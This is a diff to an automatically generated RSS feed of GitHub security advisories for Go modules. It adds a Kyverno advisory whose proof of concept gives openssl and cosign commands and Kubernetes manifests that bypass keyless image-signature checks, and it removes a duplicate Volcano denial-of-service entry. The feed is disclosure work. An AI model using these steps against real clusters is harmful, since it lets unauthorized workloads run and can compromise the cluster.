@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2025-05-08T14:01:23.335Z</updated>
+    <updated>2025-05-08T15:01:27.230Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,166 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/kyverno/kyverno] Kyverno ignores subjectRegExp and IssuerRegExp]]></title>
+        <id>https://github.com/advisories/GHSA-46mp-8w32-6g94</id>
+        <link href="https://github.com/advisories/GHSA-46mp-8w32-6g94"/>
+        <updated>2025-05-08T14:51:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Kyverno ignores subjectRegExp and IssuerRegExp while verifying artifact's sign with keyless mode. It allows the attacker to deploy kubernetes resources with the artifacts that were signed by unexpected certificate.</p>
+<h3 id="details">Details</h3>
+<p>Kyverno checks only subject and issuer fields when verifying an artifact's signature: <a href="https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537">https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537</a>. While there are subjectRegExp and issuerRegExp fields that can also be used for the defining expected subject and issue values. If the last ones are used then their values are not taken in count and there is no actually restriction for the certificate that was used for the image sign.</p>
+<h3 id="poc">PoC</h3>
+<p>For the successful exploitation attacker needs:</p>
+<ul>
+<li>Private key of any certificate in the certificate chain that trusted by cosign. It can be certificate that signed by company's self-signed Root CA if they are using their own PKI.</li>
+<li>Access to container registry to push artifacts images </li>
+<li>Availability to deploy malicious artifacts to the kubernetes cluster</li>
+</ul>
+<ol>
+<li>Generate certificate that will be used for the image signing with the oidcissuer url. That can be done with the Fulcio or manually by using openssl</li>
+</ol>
+<pre><code># Create self-signed RootCA
+openssl req -x509 -newkey rsa:4096 -keyout root-ca-key.pem -sha256 -noenc -days 9999 -subj "/C=AA/L=Location/O=IT/OU=Security/CN=Root Certificate Authority" -out root-ca.pem
+
+
+# Create request for the intermediate certificate
+openssl req -noenc -newkey rsa:4096 -keyout intermediate-ca-key.pem -addext "subjectKeyIdentifier = hash" -addext "keyUsage = critical,keyCertSign" -addext "basicConstraints = critical,CA:TRUE,pathlen:2" -subj "/C=AA/L=Location/O=IT/OU=Security/CN=Intermediate Certificate Authority" -out intermediate-ca.csr
+
+# Issue intermediate cert with RootCA
+openssl x509 -req -days 9999 -sha256 -in intermediate-ca.csr -CA root-ca.pem -CAkey root-ca-key.pem -copy_extensions copy -out intermediate-ca.pem
+
+# OID_1_1 is the hexadecimal representation of the oidcissuer url
+OID_1_1=$(echo -n "https://me.net" | xxd -p -u)
+
+# Create request for the leaf certificate
+openssl req -noenc -newkey rsa:4096 -keyout my-key.pem -addext "subjectKeyIdentifier = hash" -addext "basicConstraints = critical,CA:FALSE" -addext "keyUsage = critical,digitalSignature" -addext "subjectAltName = email:me@me.net" -addext "1.3.6.1.4.1.57264.1.1 = DER:${OID_1_1}" -addext "1.3.6.1.4.1.57264.1.8 = ASN1:UTF8String:https://me.net" -subj "/C=AA/L=Location/O=IT/OU=Security/CN=My Cosign Certificate" -out my-cert.csr
+
+# Issue leaf cert with Intermediate CA
+openssl x509 -req -in my-cert.csr -CA intermediate-ca.pem -CAkey intermediate-ca-key.pem -copy_extensions copy -days 9999 -sha256 -out my-cert.pem
+
+# Generate certificates chain
+cat intermediate-ca.pem root-ca.pem &gt; cert-chain.pem
+</code></pre>
+<ol start="2">
+<li>Build and push container image</li>
+<li>Import key and sign the image with the generated certificate</li>
+</ol>
+<pre><code>COSIGN_PASSWORD="" cosign import-key-pair --key my-key.pem --output-key-prefix=import-my-key
+COSIGN_PASSWORD="" cosign sign $IMAGE_WITH_HASH --tlog-upload=false --cert my-cert.pem --cert-chain cert-chain.pem --key import-my-key.key
+</code></pre>
+<ol start="3">
+<li>Add ClusterPolicy for the Kyverno with the wrong subject and issuer regexp. Adding (Fulcio) Root CA as secret and using it in policy is optional only if cosign cannot trust it:</li>
+</ol>
+<pre><code>apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: check-image-keyless
+spec:
+  validationFailureAction: Enforce
+  webhookTimeoutSeconds: 30
+  rules:
+    - name: check-image-keyless
+      match:
+        any:
+        - resources:
+            kinds:
+              - Pod
+      context:
+        - name: encodedCert
+          apiCall:
+            urlPath: "/api/v1/namespaces/kyverno/secrets/fulcio-ca"
+            method: GET
+            jmesPath: "data.\"fulcio-ca.pem\""
+        - name: root
+          variable:
+            jmesPath: "base64_decode(encodedCert)"
+      verifyImages:
+      - imageReferences:
+        - "&lt;IMAGE_REGEXP&gt;"
+        attestors:
+        - entries:
+          - keyless:
+              subjectRegExp: https://ivalid
+              issuerRegExp: https://ivalid
+              roots: "{{root}}"
+              rekor:
+                url: &lt;URL_TO_REKOR&gt;
+                pubkey: |-
+                  -----BEGIN PUBLIC KEY-----
+                  ...
+                  -----END PUBLIC KEY-----
+              ctlog:
+                pubkey: |-
+                  -----BEGIN PUBLIC KEY-----
+                  ...
+                  -----END PUBLIC KEY-----
+</code></pre>
+<ol start="4">
+<li>Deploy previously signed image</li>
+</ol>
+<pre><code>apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: image-sign
+  name: image-sign
+  namespace: default
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: image-sign
+  strategy: {}
+  template:
+    metadata:
+      annotations:
+      labels:
+        app: image-sign
+    spec:
+      containers:
+        - image: &lt;YOUR_IMAGE&gt;
+          imagePullPolicy: Always
+          name: image-signing
+          ports:
+            - containerPort: 5000
+          resources:
+            requests:
+              memory: 500Mi
+              cpu: 0.1
+            limits:
+              memory: 2Gi
+              cpu: 0.2
+      restartPolicy: Always
+status: {}
+</code></pre>
+<ol start="5">
+<li>The deployment with pods will be create successfully due to not checking subjectRegExp and issuerRegExp fields validation</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Deploying unauthorized kubernetes resources that can lead to full compromise of kubernetes cluster</p>
+<h3 id="ps">P.S.</h3>
+<p>Problem was discovered by me when testing image sign verifying with keyless signing: 
+<a href="https://kubernetes.slack.com/archives/CLGR9BJU9/p1740136401365279?thread_ts=1740136401.365279&amp;cid=CLGR9BJU9">https://kubernetes.slack.com/archives/CLGR9BJU9/p1740136401365279?thread_ts=1740136401.365279&amp;cid=CLGR9BJU9</a>. Then it was <a href="https://github.com/kyverno/policies/issues/1246">verified</a> and <a href="https://github.com/kyverno/kyverno/pull/12237">fixed</a> by <a href="https://github.com/Mohdcode">Mohcode</a>. But i think it should be registered as security problem such as it allows to bypass part of the verification mechanism and Kyverno users should be aware of it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kyverno/kyverno/security/advisories/GHSA-46mp-8w32-6g94">https://github.com/kyverno/kyverno/security/advisories/GHSA-46mp-8w32-6g94</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29778">https://nvd.nist.gov/vuln/detail/CVE-2025-29778</a></li>
+<li><a href="https://github.com/kyverno/policies/issues/1246">https://github.com/kyverno/policies/issues/1246</a></li>
+<li><a href="https://github.com/kyverno/kyverno/pull/12237">https://github.com/kyverno/kyverno/pull/12237</a></li>
+<li><a href="https://github.com/kyverno/kyverno/commit/8777672fb17bdf252bd2e7d8de3441e240404a60">https://github.com/kyverno/kyverno/commit/8777672fb17bdf252bd2e7d8de3441e240404a60</a></li>
+<li><a href="https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537">https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537</a></li>
+<li><a href="https://github.com/advisories/GHSA-46mp-8w32-6g94">https://github.com/advisories/GHSA-46mp-8w32-6g94</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-46mp-8w32-6g94</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-24T19:07:28.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/blevesearch/bleve/v2] Missing Role Based Access Control for the REST handlers in bleve/http package]]></title>
         <id>https://github.com/advisories/GHSA-9w9f-6mg8-jp7w</id>
@@ -639,41 +799,6 @@ Upgrade to v1.8.11. This upgrade is backwards compatible.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-04-30T16:43:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[volcano.sh/volcano] Volcano Scheduler Denial of Service via Unbounded Response from Elastic Service/extender Plugin]]></title>
-        <id>https://github.com/advisories/GHSA-hg79-fw4p-25p8</id>
-        <link href="https://github.com/advisories/GHSA-hg79-fw4p-25p8"/>
-        <updated>2025-05-06T19:12:09.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>This issue allows an attacker who has compromised either the Elastic service or the extender plugin to cause denial of service of the scheduler. This is a privilege escalation, because Volcano users may run their Elastic service and extender plugins in separate pods or nodes from the scheduler. In the Kubernetes security model, node isolation is a security boundary, and as such an attacker is able to cross that boundary in Volcano's case if they have compromised either the vulnerable services or the pod/node in which they are deployed.  The scheduler will become unavailable to other users and workloads in the cluster. The scheduler will either crash with an unrecoverable OOM panic or freeze while consuming excessive amounts of memory.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/volcano-sh/volcano/security/advisories/GHSA-hg79-fw4p-25p8">https://github.com/volcano-sh/volcano/security/advisories/GHSA-hg79-fw4p-25p8</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/commit/45a4347471a5254121d10afef04c6732095fa398">https://github.com/volcano-sh/volcano/commit/45a4347471a5254121d10afef04c6732095fa398</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/commit/7103c18de19821cd278f949fa24c13da350a8c5d">https://github.com/volcano-sh/volcano/commit/7103c18de19821cd278f949fa24c13da350a8c5d</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/commit/735842af59b9be0da5090677db7693c98a798b2a">https://github.com/volcano-sh/volcano/commit/735842af59b9be0da5090677db7693c98a798b2a</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/commit/7c0ea53fa3cfa7a05b5fba7a8af7bfe88adc41c3">https://github.com/volcano-sh/volcano/commit/7c0ea53fa3cfa7a05b5fba7a8af7bfe88adc41c3</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/commit/d687f75a11fa36f37b54e4b6ff8e49bc0a3ca6b4">https://github.com/volcano-sh/volcano/commit/d687f75a11fa36f37b54e4b6ff8e49bc0a3ca6b4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32777">https://nvd.nist.gov/vuln/detail/CVE-2025-32777</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/releases/tag/v1.10.2">https://github.com/volcano-sh/volcano/releases/tag/v1.10.2</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/releases/tag/v1.11.0-network-topology-preview.3">https://github.com/volcano-sh/volcano/releases/tag/v1.11.0-network-topology-preview.3</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/releases/tag/v1.11.2">https://github.com/volcano-sh/volcano/releases/tag/v1.11.2</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/releases/tag/v1.12.0-alpha.2">https://github.com/volcano-sh/volcano/releases/tag/v1.12.0-alpha.2</a></li>
-<li><a href="https://github.com/volcano-sh/volcano/releases/tag/v1.9.1">https://github.com/volcano-sh/volcano/releases/tag/v1.9.1</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2025-3656">https://pkg.go.dev/vuln/GO-2025-3656</a></li>
-<li><a href="https://github.com/advisories/GHSA-hg79-fw4p-25p8">https://github.com/advisories/GHSA-hg79-fw4p-25p8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hg79-fw4p-25p8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-04-30T16:40:03.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[volcano.sh/volcano] Volcano Scheduler Denial of Service via Unbounded Response from Elastic Service/extender Plugin]]></title>
